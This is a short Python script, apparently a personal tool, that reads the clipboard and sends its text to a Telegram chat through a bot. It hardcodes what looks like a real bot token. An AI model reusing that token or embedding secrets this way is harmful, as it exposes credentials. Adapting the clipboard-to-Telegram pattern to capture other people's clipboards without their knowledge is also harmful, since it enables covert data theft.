def maindef():

    import requests
    import pyperclip

    TOKEN = "7745947395:AAGA43r6kc_9xajySwxXsNTI_wZGJlJjzkk"
    chat_id = "1234567890" #Your Chat ID
    link = pyperclip.paste()

    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": link}

    response = requests.post(url, data=data)

if __name__ == "__main__":
    maindef()